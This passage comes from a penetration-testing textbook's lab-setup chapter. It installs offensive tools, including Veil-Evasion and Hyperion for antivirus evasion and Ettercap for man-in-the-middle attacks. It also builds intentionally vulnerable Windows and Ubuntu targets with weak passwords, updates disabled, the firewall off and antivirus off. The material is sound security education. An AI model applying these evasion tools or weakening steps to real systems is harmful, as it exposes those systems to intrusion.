as Nessus processes various plugins. Progress is shown by a line of hash 
symbols (#). 
Selecting previously unselected package nessus.
(Reading database ... 355024 files and directories currently installed.)
Unpacking nessus (from Nessus-5.2.5-debian6_amd64.deb) ...
Setting up nessus (5.2.5) ...
nessusd (Nessus) 5.2.5 [build N25109] for Linux
Copyright (C) 1998 - 2014 Tenable Network Security, Inc
Processing the Nessus plugins...
[########### ]
6. Once you‚Äôre returned to the root prompt with no errors, Nessus should 
be installed, and you should see a message like this.
All plugins loaded
Fetching the newest plugins from nessus.org...
Fetching the newest updates from nessus.org...
Done. The Nessus server will start processing these plugins within a 
minute
nessusd (Nessus) 5.2.5 [build N25109] for Linux
Copyright (C) 1998 - 2014 Tenable Network Security, Inc
Processing the Nessus plugins...
[##################################################]
All plugins loaded
 - You can start nessusd by typing /etc/init.d/nessusd start
 - Then go to https://kali:8834/ to configure your scanner
7. Now enter the following to start Nessus.
root@kali:~# /etc/init.d/nessusd start
8. Open the URL https://kali:8834/ in the Iceweasel web browser. You 
should see a SSL certificate warning, similar to that in Figure 1-10.
note If you access Nessus from outside the Iceweasel browser in Kali, you will need to go to 
https://<ipaddressofKali>:8834 instead.
Setting Up Your Virtual Lab 19
Figure 1-10: Invalid SSL certificate warning
9. Expand I Understand the Risks and click Add Exception. Then click 
Confirm Security Exception, as shown in Figure 1-11.
Figure 1-11: Confirming the security exception 
20 Chapter 1
10. Click Get Started at the bottom left of the opening Nessus page and 
enter a username and password on the following page. I‚Äôve chosen 
georgia:password for my example. If you choose something else, remember 
it because we‚Äôll use Nessus in Chapter 6. (Note that I use poor passwords 
throughout this book, as will many clients you encounter. In production, 
you should use much better passwords than password.)
11. At the next page, enter the activation code you received via email from 
Tenable Security. 
12. Once registered with Tenable Security, choose the option to download 
plugins (downloading will take some time). Once Nessus processes the 
plugins, it will initialize.
When Nessus finishes downloading plugins and configuring the software, you should see the Nessus login screen, as shown in Figure 1-12. You 
should be able to use the credentials for the account you created during 
setup to log in. 
Figure 1-12: Login screen of the Nessus web interface 
To close Nessus, just close its tab in the browser. We will come back to 
Nessus in Chapter 6.
Installing Additional Software
We‚Äôre not done yet. Follow these instructions to complete your Kali Linux 
install.
The Ming C Compiler
We need to install a cross compiler so we can compile C code to run on 
Microsoft Windows systems. The Ming compiler is included in the Kali Linux 
repositories but is not installed by default. Install it with this command.
root@kali:~# apt-get install mingw32
Setting Up Your Virtual Lab 21
Hyperion
We‚Äôll use the Hyperion encryption program to bypass antivirus software. 
Hyperion is not currently included in the Kali repositories. Download 
Hyperion with wget, unzip it, and compile it with the Ming cross compiler 
you installed in the previous step, as shown in Listing 1-2.
root@kali:~# wget http://nullsecurity.net/tools/binary/Hyperion-1.0.zip
root@kali:~# unzip Hyperion-1.0.zip 
Archive: Hyperion-1.0.zip
 creating: Hyperion-1.0/
 creating: Hyperion-1.0/FasmAES-1.0/
root@kali:~# i586-mingw32msvc-c++ Hyperion-1.0/Src/Crypter/*.cpp -o hyperion.exe
--snip--
Listing 1-2: Installing Hyperion 
Veil-Evasion
Veil-Evasion is a tool that generates payload executables you can use to bypass 
common antivirus solutions. Install Veil-Evasion Kali (see Listing 1-3) by first 
downloading it with the command wget. Next, unzip the downloaded file 
master.zip and change to the Veil-master/setup directory. Finally, enter ./setup.sh
and follow the default prompts. 
root@kali:~# wget https://github.com/ChrisTruncer/Veil/archive/master.zip
--2015-11-26 09:54:10-- https://github.com/ChrisTruncer/Veil/archive/master.zip
--snip--
2015-11-26 09:54:14 (880 KB/s) - `master.zip' saved [665425]
root@kali:~# unzip master.zip
Archive: master.zip
948984fa75899dc45a1939ffbf4fc0e2ede0c4c4
 creating: Veil-Evasion-master/
--snip--
 inflating: Veil-Evasion-master/tools/pyherion.py 
root@kali:~# cd Veil-Evasion-master/setup
root@kali:~/Veil-Evasion-master/setup# ./setup.sh 
=========================================================================
 [Web]: https://www.veil-evasion.com | [Twitter]: @veilevasion
=========================================================================
 [*] Initializing Apt Dependencies Installation
--snip‚Äî
Do you want to continue? [Y/n]? Y
--snip--
root@kali:~#
Listing 1-3: Installing Veil-Evasion 
22 Chapter 1
Ettercap
Ettercap is a tool for performing man-in-the-middle attacks. Before running it for the first time, we need to make a couple of changes to its configuration file at /etc/ettercap/etter.conf. Open its configuration file from a Kali 
root prompt in the nano editor. 
root@kali:~# nano /etc/ettercap/etter.conf
First change the userid and groupid values to 0 so Ettercap can run with 
root privileges. Scroll down to where you see the following lines in the file. 
Replace whatever values you see following the equal signs (=) with a 0.
[privs]
ec_uid = 0 # nobody is the default
ec_gid = 0 # nobody is the default
Now scroll down to the Linux section of the file and uncomment 
(remove the leading # characters) before the two lines shown at u and v
in Listing 1-4 to set Iptables firewall rules to redirect the traffic. 
#---------------
# Linux 
#---------------
# if you use ipchains:
 #redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT 
%rport"
 #redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT 
%rport"
# if you use iptables:
 uredir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j 
 REDIRECT --to-port %rport"
 vredir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j 
 REDIRECT --to-port %rport"
Listing 1-4: Ettercap configuration file
Save and exit the file by pressing ctrl-X and then Y to save the changes.
Setting Up Android Emulators 
Now we‚Äôll set up three Android emulators on Kali to use for mobile testing 
in Chapter 20. First we‚Äôll need to download the Android SDK. 
1. Open the Iceweasel web browser from within Kali and visit https://
developer.android.com/sdk/index.html.
2. Download the current version of the ADT bundle for 32-bit Linux and 
save it to your root directory.
Setting Up Your Virtual Lab 23
3. Open a terminal, list the files there (ls), and extract the compressed 
archive that you just downloaded with unzip (the x‚Äôs represent the name 
of your file, as versions may have changed since this was written).
root@kali:~# unzip adt-bundle-Linux-x86-xxxxxxxxxxx.zip
4. Now use cd to go into the new directory (with the same name as the file 
without the .zip extension).
# cd sdk/tools
# ./android 
5. The Android SDK Manager should open, as shown in Figure 1-13.
Figure 1-13: The Android SDK Manager 
We‚Äôll download any updates to the Android SDK tools and Android SDK 
platform tools (checked by default), as well as Android 4.3 and a couple of 
older versions of Android with specific vulnerabilities, Android 2.2 and 
Android 2.1. Select the boxes to the left of each Android version. Then 
(leaving Updates/New and Installed checked) click Install packages, as 
shown in Figure 1-14. Accept the license agreement, and the Android SDK 
should download and install the chosen packages. Installation will likely 
take several minutes.
24 Chapter 1
Figure 1-14: Installing Android software
Now it‚Äôs time to set up our Android virtual devices. Open the Android 
SDK Manager and choose Tools4Manage AVDs. You should see the window shown in Figure 1-15. 
Figure 1-15: Android Virtual Device Manager 
Setting Up Your Virtual Lab 25
We‚Äôll create three Android emulators based on Android 4.3, 2.2, 
and 2.1, as shown in Figure 1-16. Use the values shown in the figure for 
each emulator but set the value of Target to the Android version of the 
emulator you would like to build (the Google API versions of Android 4.3 
[Google APIs version 18], 2.2 [Google APIs version 8], and 2.1 [Google 
APIs version 7]). Fill the AVD Name field with a descriptive value. Add a 
small SD Card value (100MB should be more than sufficient) so you can 
download files to your Android emulators. Set Device to Nexus 4 and Skin 
to Skin with dynamic hardware controls. Leave the rest of the options at 
their defaults. 
Figure 1-16: Creating an Android emulator 
Once you‚Äôve built all three emulators, your AVD Manager should look 
like Figure 1-17 (device names may be different of course).
26 Chapter 1
Figure 1-17: Android emulators created in Android Virtual Device Manager
To start an emulator, highlight it and click Start. Then click Launch in 
the pop-up, as shown in Figure 1-18. 
Figure 1-18: Launching an Android emulator 
It may take a few minutes for the emulator to boot up for the first time, 
but once it does, you should have something that looks and feels much like 
a real Android device. The Android 4.3 emulator is shown in Figure 1-19.
Setting Up Your Virtual Lab 27
Figure 1-19: Android 4.3 emulator 
N ote To run the Android emulators in Kali, you will likely need to increase the performance of your virtual machine by increasing its RAM and CPU cores. I am able to
run all three emulators with 3GB RAM and two CPU cores allocated to Kali. You 
can make these changes in the virtual machine settings in your VMware product. The 
amount of power you can give to Kali will, of course, depend on the resources available on your host machine. As an alternative, instead of running the Android emulators on Kali Linux, you can install Android and the emulators on your host system 
or even another system on the local network. The exercises in Chapter 20 will work as 
long as the emulators can communicate with Kali. 
Smartphone Pentest Framework
Next, download and install the Smartphone Pentest Framework (SPF), which 
we‚Äôll use for mobile attacks. Use git to download the source code. Change 
to the downloaded Smartphone-Pentest-Framework directory as shown here. 
root@kali:~# git clone -b SPFBook https://github.com/georgiaw/Smartphone-Pentest-Framework.git
root@kali:~# cd Smartphone-Pentest-Framework
Now open the file kaliinstall in the nano text editor. The first few lines 
are shown in Listing 1-5. Note the lines that refer to /root/adt-bundle-linux
-x86-20131030/sdk/tools/android. If the name of your ADT bundle folder is 
different (due to the release of a subsequent version), change this value to 
match the correct place where you installed the Android ADT in the previous section. 
28 Chapter 1
root@kali:~/Smartphone-Pentest-Framework# nano kaliinstall 
#!/bin/sh
## Install needed packages
echo -e "$(tput setaf 1)\nInstallin serialport, dbdpg, and expect for perl\n"; echo "$(tput 
sgr0)"
echo -e "$(tput setaf 1)#########################################\n"; echo "$(tput sgr0)"
echo $cwd;
#apt-get -y install libexpect-perl libdbd-pg-perl libdevice-serialport-perl; 
apt-get install ant
/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter android-4 -a
/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter addon-google_
apis-google-4 -a
/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter android-14 -a
/root/adt-bundle-linux-x86-20131030/sdk/tools/android update sdk --no-ui --filter addon-google_
apis-google-14 -a
--snip--
Listing 1-5: Installing Smartphone Pentest Framework
Now run the kaliinstall script, as shown here.
root@kali:~/Smartphone-Pentest-Framework# ./kaliinstall 
This will set up the SPF, which we‚Äôll use in Chapter 20. 
Finally, we need to make one more change to the configuration file for 
SPF. Change directories to Smartphone-Pentest-Framework/frameworkconsole
and open the file config in nano. Look for the option #LOCATION OF ANDROID 
SDK. If your ADT bundle folder name has changed since the version current 
at the time of this writing, change it accordingly in the line that begins with 
ANDROIDSDK=.
root@kali:~/Smartphone-Pentest-Framework# cd frameworkconsole/
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# nano config
--snip--
#LOCATION OF ANDROID SDK
ANDROIDSDK = /root/adt-bundle-linux-x86-20131030/sdk
--snip--
Target Virtual Machin
We‚Äôll use three custom-built target machines to simulate vulnerabilities 
often found in client environments: Ubuntu 8.10, Windows XP SP3, and 
Windows 7 SP1. 
You‚Äôll find a link to a torrent containing the Ubuntu virtual machine 
at http://www.nostarch.com/pentesting/. The target system is compressed using 
the 7-Zip archive, and 1stPentestBook?! is the password for the archive. You can 
use 7-Zip programs to open the archives for all platforms. For the Windows 
and Linux packages, use http://www.7-zip.org/download.html; for Mac OS, use 
Ez7z at http://ez7z.en.softonic.com/mac/. The archive is ready for use as soon as 
it is unzipped. 
Setting Up Your Virtual Lab 29
To set up the Windows virtual machines, you‚Äôll need to install and configure Windows XP SP3 and 32-bit Windows 7 SP1. Sources for the installation media include TechNet and MSDN (the Microsoft Developer Network), 
among others. (You should be able to use your Windows virtual machines 
on a trial basis for 30 days without a license key.) 
Creating the Windows XP Tar
Your Windows XP target should be a base installation of Windows XP SP3 
with no additional security updates. (Visit my website at http://www
.bulbsecurity.com/ for more information about finding a copy of Windows XP.)
Once you have a copy of Windows XP SP3, here‚Äôs how to install it on 
Microsoft Windows or Mac OS.
VMware Player on Microsoft Windows
To install Windows XP on VMware Player for Windows: 
1. Choose Create A New Virtual Machine in VMware Player and point 
the New Virtual Machine Wizard to the Windows XP installation disk 
or ISO image. Depending on your source disk or image, you may be 
offered the option to use Easy Install (if you‚Äôre installing a version with 
a license key), or you may see a yellow triangle warning, ‚ÄúCould not 
detect which operating system is in this disc image. You will need to 
specify which operating system will be installed.‚Äù In the latter case, just 
press Next.
2. In the Select a Guest Operating System dialog, select Microsoft Windows
in the Guest operating system section and your version of Windows XP in 
the drop-down box, as shown in Figure 1-20, and press Next.
Figure 1-20: Selecting your version of Windows XP
30 Chapter 1
3. In the next dialog, enter Bookxp XP SP3 as the name of your virtual 
machine and press Next.
4. In the Specify Disk Capacity dialog, accept the recommended hard disk 
size for your virtual machine of 40GB and check the box for Store virtual disk as a single file, as shown in Figure 1-21, and press Next.
Figure 1-21: Specifying the disk capacity
N ote The Virtual Machine will not take up the entire 40GB; it will only take up space on
your hard drive as needed. This is just a maximum value. 
5. In the Ready to Create Virtual Machine dialog, shown in Figure 1-22, 
click Customize Hardware.
Figure 1-22: Customizing your hardware
Setting Up Your Virtual Lab 31
6. In the Hardware dialog, choose Network Adapter, and in the Network 
Connection field that appears, select Bridged: Connected directly to 
the physical network. Next, click Configure Adapters and select the 
adapter you‚Äôre using to connect to the Internet, as shown in Figure 1-23. 
Then press OK, Close, and Finish. 
Figure 1-23: Configuring your network adapter as bridged
You should now be able to play your Windows XP virtual machine. 
Continue to the instructions for installing and activating Windows XP 
in ‚ÄúInstalling and Activating Windows‚Äù on page 32.
VMware Fusion on Mac OS
In VMware Fusion, go to File4New4Import from disk or image
and point it to the Windows XP installation disk or image, as shown 
in Figure 1-24.
Follow the prompts to create a fresh installation of Windows XP SP3. 
32 Chapter 1
Figure 1-24: Creating a new virtual machine 
Installing and Activating Windows
As part of the installation process, you will be prompted for a Windows 
license key. If you have one, enter it here. If not, you should be able to use 
the virtual machine on a trial basis for 30 days. To continue without entering a license key, click Next when prompted for the key. A pop-up will warn 
you that entering a license key is recommended and ask if you would like to 
enter one now, as shown in Figure 1-25. Just click No.
Figure 1-25: License key dialog
Setting Up Your Virtual Lab 33
As shown in Figure 1-26, when prompted, set Computer name to Bookxp. 
Set Administrator password to password.
Figure 1-26: Setting the computer name and Administrator password
You can leave the date/time and TCP/IP settings at their defaults when 
prompted. Likewise, leave the Windows XP target as part of the workgroup 
WORKGROUP instead of joining it to a domain, as shown in Figure 1-27.
Figure 1-27: Workgroup settings
34 Chapter 1
Tell Windows not to automatically install security updates, as shown in 
Figure 1-28. This step is important, because some of the exploits we will run 
rely on missing Windows patches. 
Figure 1-28: Turning off automatic security updates
You will then be prompted to activate Windows. If you entered a license 
key, go ahead and activate it. Otherwise you can choose No, remind me 
every few days, as shown in Figure 1-29.
Figure 1-29: Activating Windows 
Setting Up Your Virtual Lab 35
Now create user accounts georgia and secret, as shown in Figure 1-30. We 
will create passwords for these users after setup is finished. 
Figure 1-30: Adding users 
When Windows starts up, log in as the user georgia with no 
password. 
Installing VMware Tools
Now install VMware Tools, which will make it easier to use your virtual 
machine by, for example, letting you copy/paste and drag programs onto 
the virtual machine from the host system. 
VMware Player on Microsoft Windows
In VMware Player, install VMware Tools from Player4Manage4Install 
VMware Tools, as shown in Figure 1-31. The VMware Tools installer should 
automatically run in Windows XP.
36 Chapter 1
Figure 1-31: Installing VMware Tools in VMware Player
VMware Fusion on Mac OS
Install VMware Tools from Virtual Machines4Install VMware Tools, as 
shown in Figure 1-32. The VMware Tools installer should automatically run 
in Windows XP.
Figure 1-32: Installing VMware Tools in VMware Fusion
Setting Up Your Virtual Lab 37
Turning Off Windows Firewall
Now open the Control Panel from the Windows Start menu. Click Security 
Center4Windows Firewall to turn off the Windows Firewall, as shown in 
Figure 1-33.
Figure 1-33: Turning off the Windows firewall
Setting User Passwords 
Again in the Control Panel, go to User Accounts. Click the user georgia
and then select Create a password. Set georgia‚Äôs password to password, as 
shown in Figure 1-34. Do the same thing for the user secret, but set secret‚Äôs 
password to Password123.
Figure 1-34: Setting a user password 
38 Chapter 1
Setting a Static IP Address
Next, set a static IP address so your networking information won‚Äôt change 
as you work through the book. But first we need to figure out the address 
of our default gateway. 
Ensure that your Windows XP system is set to use bridged networking 
in VMware. By default, your virtual machine will automatically pull an IP 
address using DHCP. 
To find the default gateway, open a Windows command prompt by 
going to Start4Run, entering cmd, and clicking OK. In the command 
prompt, enter ipconfig. This will show you the networking information, 
including the default gateway.
C:\Documents and Settings\georgia>ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
 Connection-specific DNS Suffix . : XXXXXXXX 
 IP Address. . . . . . . . . . . . : 192.168.20.10 
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 192.168.20.1
C:\Documents and Settings\georgia>
In my case, the IP address is 192.168.20.10, the subnet mask is 
255.255.255.0, and the default gateway is 192.168.20.1. 
1. In the Control Panel, go to Network and Internet Connections and 
click Network Connections at the bottom of the screen. 
2. Right-click Local Area Connection and then select Properties. 
3. Highlight Internet Protocol (TCP/IP) and select Properties. Now 
enter a static IP address and set the Subnet mask and Default gateway 
to match the data you found with the ipconfig command, as shown in 
Figure 1-35. Set the Preferred DNS server to your default gateway as well. 
Now it‚Äôs time to see if our virtual machines can communicate. Once 
you‚Äôre sure that the settings match, return to the Kali virtual machine (start 
it if you had shut it down) and enter ping <static ip address of your Windows 
XP virtual machine>, as shown here. 
N ote My IP address is 192.168.20.10. Throughout the book, you should replace this
value with the IP address of your systems. 
root@kali:~# ping 192.168.20.10
PING 192.168.20.10 (192.168.20.10) 56(84) bytes of data.
64 bytes from 192.168.20.10: icmp_req=1 ttl=128 time=3.06 ms
^C
Setting Up Your Virtual Lab 39
Figure 1-35: Setting a static IP address
Enter ctrl-C to stop the ping command. If you see output beginning 
with 64 bytes from <ip address of XP>, as shown previously, your virtual 
machines are able to communicate. Congratulations! You‚Äôve set up a network of virtual machines.
If instead you see a message including the text Destination Host 
Unreachable, troubleshoot your networking: Make sure your virtual 
machines are on the same bridged virtual network, check that your 
default gateway is correct, and so on. 
Making XP Act Like It‚Äôs a Member of a Windows Domain
Finally, we need to modify a setting in Windows XP so that it will behave as 
if it were a member of a Windows domain, as many of your clients will be. 
I‚Äôm not having you set up an entire Windows domain here, but during post 
exploitation, a couple of exercises will simulate a domain environment. 
Return to your XP virtual machine and follow these steps. 
1. Select Start4Run and enter secpol.msc to open the Local Security 
Settings panel.
2. Expand Local Policies on the left and double-click Security Options
on the right.
3. In the Policy list in the pane on the right, double-click Network access: 
Sharing and security model for local accounts and choose Classic 
- local users authenticate as themselves from the drop-down list, as 
shown in Figure 1-36. 
40 Chapter 1
Figure 1-36: Changing a local security setting to make your target act like a member of a 
Windows domain
4. Click Apply and then OK.
5. Close any open windows in your virtual machine.
Installing Vulnerable Software
In this section we‚Äôll install some vulnerable software on our Windows XP 
virtual machine. We‚Äôll be attacking this software in later chapters. Open 
your Windows XP virtual machine and, while still logged in as user georgia, 
follow the directions to install each of the packages listed here.
Zervit 0.4
Download Zervit version 0.4 from http://www.exploit-db.com/exploits/12582/. 
(Click the Vulnerable App option to download the files.) Unzip the downloaded archive and double-click the Zervit program to open and run it. 
Then enter port number 3232 in the console when the software starts. 
Answer Y to allowing directory listing, as shown in Figure 1-37. Zervit will 
not automatically restart when you reboot Windows XP, so you will need to 
restart it if you reboot. 
Setting Up Your Virtual Lab 41
Figure 1-37: Starting Zervit 0.4
SLMail 5.5
Download and run SLMail version 5.5 from http://www.exploit-db.com/
exploits/638/, using the default options when prompted. Just click Next for 
all of the options and don‚Äôt change anything. If you get a warning about a 
domain name, just ignore it and click OK. We don‚Äôt really need to deliver 
any email here. 
Once SLMail is installed, restart your virtual machine. Then open 
Start4All Programs4SL Products4SLMail4SLMail Configuration. 
In the Users tab (default), right-click the SLMail Configuration window 
and choose New4User, as shown in Figure 1-38.
Figure 1-38: Adding a user in SLMail
42 Chapter 1
Click the newly created user icon, enter username georgia, and fill in 
the information for the user, as shown in Figure 1-39. The mailbox name 
should be georgia with password password. Keep the defaults and press OK
once you‚Äôve finished.
Figure 1-39: Setting the user information in SLMail 
3Com TFTP 2.0.1
Next, download 3Com TFTP version 2.0.1 as a zipped file from http://www
.exploit-db.com/exploits/3388/. Extract the files and copy 3CTftpSvcCtrl and 
3CTftpSvc to the directory C:\Windows, as shown in Figure 1-40. 
Figure 1-40: Copying 3Com TFTP to C:\Windows
Setting Up Your Virtual Lab 43
Then open 3CTftpSvcCtrl (the blue 3 icon) and click Install Service, as 
shown in Figure 1-41.
Figure 1-41: Installing 3Com TFTP
Click Start Service to start 3Com TFTP for the first time. From now on, it 
will automatically start when you boot up the computer. Press Quit to exit.
XAMPP 1.7.
Now we‚Äôll install an older version of the XAMPP software, version 1.7.2, from 
http://www.oldapps.com/xampp.php?old_xampp=45/. (The older version of 
Internet Explorer on Windows XP seems to have some trouble opening this 
page. If you have trouble, download the software from your host system and 
copy it onto Windows XP‚Äôs desktop.)
1. Run the installer and accept the default options as they‚Äôre presented to 
you. When installation is finished, choose option 1. start XAMPP Control 
Panel, as shown in Figure 1-42.
Figure 1-42: Starting XAMPP Control Panel
44 Chapter 1
2. In the XAMPP Control Panel, install the Apache, MySQL, and FileZilla 
services (select the Svc checkbox to the left of the service name). Then 
click the Start button for each service. Your screen should look like the 
one shown in Figure 1-43.
Figure 1-43: Installing and starting XAMPP services
3. Click the Admin button for FileZilla in the XAMPP Control Panel. The 
Admin panel is shown in Figure 1-44. 
Figure 1-44: FileZilla Admin panel
4. Go to Edit4Users to open the Users dialog, shown in Figure 1-45. 
5. Click the Add button on the right of the dialog box. 
6. In the Add User Account dialog box, enter georgia and press OK.
Setting Up Your Virtual Lab 45
Figure 1-45: Adding an FTP user
7. With georgia highlighted, check the Password box under Account 
Settings and enter password. 
Click OK. When prompted to share a folder, browse to the georgia‚Äôs
Documents folder on Windows and select it to share it, as shown in Figure 1-46. 
Leave the defaults for all other checkboxes, as shown in the figure. Click 
OK once you‚Äôve finished and exit the various open windows.
Figure 1-46: Sharing a folder via FTP
46 Chapter 1
Adobe Acrobat Read
Now we‚Äôll install Adobe Acrobat Reader version 8.1.2 from http://www.oldapps
.com/adobe_reader.php?old_adobe=17/. Follow the default prompts to install it. 
Click Finish once you‚Äôre done. (Here again you may need to download the 
file to your host system and copy it to Windows XP‚Äôs desktop.)
War-FTP 
Next, download and install War-FTP version 1.65 from http://www.exploit-db
.com/exploits/3570/. Download the executable from exploit-db.com to georgia‚Äôs 
desktop and run the downloaded executable to install. You do not need to 
start the FTP service; we will turn it on when we discuss exploit development in Chapters 16 through 19.
WinSCP
Download and install the latest version of WinSCP from http://winscp.net/. 
Choose the Typical Installation option. You can uncheck the additional 
add-ons. Click Finish once you‚Äôre done.
Installing Immunity Debugger and Mona 
Now we‚Äôll finish up the Windows XP virtual machine by installing a debugger, a tool that helps detect errors in computer programs. We‚Äôll be using 
the debugger in the exploit development chapters. Visit the Immunity 
Debugger registration page at http://debugger.immunityinc.com/ID_register.py. 
Complete the registration and then press the Download button. Run the 
installer.
When asked if you want to install Python, click Yes. Accept the license 
agreement and follow the default installation prompts. When you close the 
installer, the Python installation will automatically run. Use the default 
installation values.
Once Immunity Debugger and Python have been installed, download 
mona.py from http://redmine.corelan.be/projects/mona/repository/raw/mona.py/. 
Copy mona.py to C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands, 
as shown in Figure 1-47. 
Open Immunity Debugger, and at the command prompt at the bottom 
of the window, enter !mona config -set workingfolder c:\logs\%p, as shown in 
Figure 1-48. This command tells mona to log its output to C:\logs\<program 
name>, where <program name> is the program Immunity Debugger is currently debugging. 
Now our Windows XP target is set up and ready to go. 
Setting Up Your Virtual Lab 47
Figure 1-47: Installing Mona
Figure 1-48: Setting up Mona‚Äôs logs
48 Chapter 1
Setting Up the Ubuntu 8.10 Ta
Because Linux is open source, you can simply download the Linux virtual machine as part of the torrent for this book. Unzip the 7-Zip archive 
BookUbuntu.7zip and use the password 1stPentestBook?! to open the archive. 
Open the .vmx file in VMware. If you are prompted with a message that 
says the virtual machine appears to be in use, click Take Ownership and, 
as with Kali, select I copied it. The username and password for the virtual 
machine itself are georgia:password. 
Once you have the Ubuntu virtual machine loaded, make sure the network interface is set to Bridged in VMware and click the networking icon 
(two computers) at the top right of the screen to attach the virtual machine 
to the network. Do not install any updates if prompted. As with Windows XP, 
we will exploit out-of-date software on this system. Now this virtual machine 
is all set up. (I‚Äôll show you how to set a static IP address in Linux in Chapter 2.)
Creating the Windows 7 Targe
As with Windows XP, you‚Äôll need to install a copy of Windows 7 SP1 in 
VMware by loading your image or DVD. A 30-day trial version of 32-bit 
Windows 7 Professional SP1 will work fine, but you‚Äôll need to activate it after 
30 days if you wish to continue using it. To find a legal version of Windows 7 
SP1, try one of the following:
‚Ä¢	 Visit http://www.softpedia.com/get/System/OS-Enhancements/Windows-7.shtml.
‚Ä¢	 Visit http://technet.microsoft.com/en-us/evalcenter/dn407368. 
N ote Your school or workplace may have access to programs like DreamSpark or BizSpark
that give you access to Windows operating systems. You can also check my website 
(http://www.bulbsecurity.com/) for more resources. 
Creating a User Account
After installing Windows 7 Professional SP1, opt out of security updates and 
create user Georgia Weidman as an administrator with a password of password, as shown in Figures 1-49 and 1-50.
Again opt out of automatic updates. When prompted, set the computer‚Äôs current location to a work network. Once the installation has finished, 
log in to the account Georgia Weidman. Leave the Windows Firewall enabled. 
VMware will reboot Windows 7 a few times as it installs everything.
Now tell VMware to install VMware Tools, as you did in the Windows XP 
section. After instructing VMware to install VMware Tools in the virtual 
machine, if the installer does not automatically run, go to My Computer 
and run the VMware Tools installer from the virtual machine‚Äôs DVD drive, 
as shown in Figure 1-51. 
Setting Up Your Virtual Lab 49
Figure 1-49: Setting a username
Figure 1-50: Setting a password for the user Georgia Weidman
50 Chapter 1
Figure 1-51: Installing VMware Tools
Opting Out of Automatic Updates
Though our attacks on Windows 7 will largely rely on flaws in third-party 
software rather than missing Windows patches, let‚Äôs once again opt out of 
Windows updates for this virtual machine. To do this, go to Start4Control 
Panel4System and Security. Then under Windows Update, click Turn 
Automatic Updating On or Off. Set Important updates to Never check for 
updates (not recommended) as shown in Figure 1-52. Click OK. 
Figure 1-52: Opting out of automatic updates
Setting Up Your Virtual Lab 51
Setting a Static IP Address
Set a static IP address by choosing Start4Control Panel4Network and 
Internet4Network and Sharing Center4Change Adapter Settings4Local 
Area Network. Now right-click and choose Properties4Internet Protocol 
Version 4 (TCP/IPv4)4Properties. Set these values as you did for Windows 
XP (discussed in ‚ÄúSetting a Static IP Address‚Äù on page 38), but use a different value for the Windows 7 IP address, as shown in Figure 1-53. If asked 
whether to configure this network as Home, Work, or Public, choose Work. 
(Be sure that your virtual machine network setting is configured to use a 
bridged adapter.)
Figure 1-53: Setting a static IP address 
Because the Windows firewall is turned on, Windows 7 won‚Äôt respond 
to a ping from our Kali system. Therefore, we‚Äôll ping our Kali system 
from Windows 7. Start your Kali Linux virtual machine, and from your 
Windows 7 virtual machine, click the Start button. Then enter cmd in the 
Run dialog to open a Windows command prompt. At the prompt, enter 
the following.
ping <IP Address of Kali>
If everything is working, you should see replies to the ping request as in 
‚ÄúSetting a Static IP Address‚Äù on page 38. 
52 Chapter 1
Adding a Second Network Interface
Now shut down your Windows 7 virtual machine. We‚Äôre going to add a 
second network interface to the Windows 7 virtual machine that will allow 
the Windows 7 system to be part of two networks. We‚Äôll use this setup during post exploitation to simulate attacking additional systems on a second 
network. 
In VMware Player on Microsoft Windows, choose Player4Manage4‚Ää
Virtual Machine Settings4Add, select Network Adapter, and press Next. 
This adapter will be Network Adapter 2. In VMware Fusion on Mac OS, 
go to Virtual Machine Settings, select Add a Device, and select a network 
adapter. Set this new adapter to the Host Only network. Press OK, and the 
virtual machine should restart. (We do not need to set a static IP address 
for Network Adapter 2.) When the virtual machine restarts, open Virtual 
Machine Settings again, and you should see the two network adapters 
listed. Both should be connected when your computer powers on.
Installing Additional Software
Now install the following software in your Windows 7 virtual machine, 
using default settings across the board:
‚Ä¢	 Java 7 Update 6, an out-of-date version of Java, from http://www.oldapps
.com/java.php?old_java=8120/.
‚Ä¢	 Winamp version 5.55 from http://www.oldapps.com/winamp.php?old_
winamp=247/. (Uncheck the changes to your search engine and 
so on.)
‚Ä¢	 The latest version of Mozilla Firefox from http://www.mozilla.org/.
‚Ä¢	 Microsoft Security Essentials from http://windows.microsoft.com/en-us/
windows/security-essentials-download/. (Download the latest antivirus signatures, making sure to download the correct version for your 32-bit 
Windows install. Don‚Äôt turn on automatic sample submission or scan on 
install. Also, disable real-time protection for now. We will enable this 
feature when we study bypassing antivirus software in Chapter 12. This 
setting can be found on the Settings tab under Real-time Protection. 
Uncheck Turn on real-time protection (recommended), as shown in 
Figure 1-54. Click Save changes.)
Setting Up Your Virtual Lab 53
Figure 1-54: Turning off real-time protection
Finally, install the BookApp custom web application found in the torrent 
for this book. (1stPentestBook?! is the password for the archive.) Drag and 
drop the BookApp folder on the Windows 7 virtual machine. Then follow 
the instructions in InstallApp.pdf detailing how to install BookApp. Here is 
a high-level overview of the instructions. 
1. Run Step1-install-iis.bat as an administrator by right-clicking the .bat file 
and choosing Run as administrator. (Once install finishes, you can close 
any DOS windows that are still up.)
2. Navigate to the SQL folder and run SQLEXPRWT_x86_ENU.EXE. Detailed 
instructions with screenshots are included in the InstallApp PDF.
3. Install Service Pack 3 by running SQLServer2008SP3-KB2546951-x86-ENU
.exe. When warned that program has known compatibility issues, click 
OK to run it and complete the install. Choose to accept any changes.
4. Using SQL Server Configuration Manager, enable Named Pipes.
54 Chapter 1
5. Navigate back to the main app folder and run Step2-Modify-FW.bat as an 
administrator. 
6. Install XML support for MS SQL with sqlxml_x86-v4.exe from the SQL 
folder. 
7. Run Step3-Install-App.bat as an administrator from the main app folder. 
8. Use MS SQL Management Studio to run db.sql from the SQL folder, as 
described in detail in the InstallApp PDF. 
9. Finally, change the user permissions on the AuthInfo.xml file in the book 
app folder to give full permissions to IIS_USERS.
Summar
We set up our virtual environment, downloaded and customized Kali Linux 
